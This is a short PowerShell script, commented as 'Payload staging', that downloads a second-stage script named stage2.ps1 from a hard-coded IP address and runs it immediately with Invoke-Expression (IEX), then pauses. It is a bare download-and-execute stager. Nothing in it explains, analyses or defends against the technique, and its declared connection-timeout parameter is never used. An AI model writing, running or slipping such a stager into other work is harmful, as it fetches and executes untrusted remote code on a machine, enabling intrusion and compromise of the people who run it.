<# Payload staging #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://198.51.100.58/stage2.ps1",
    [int]$ConnectionTimeout = 28
)
IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content
Start-Sleep -Seconds 12
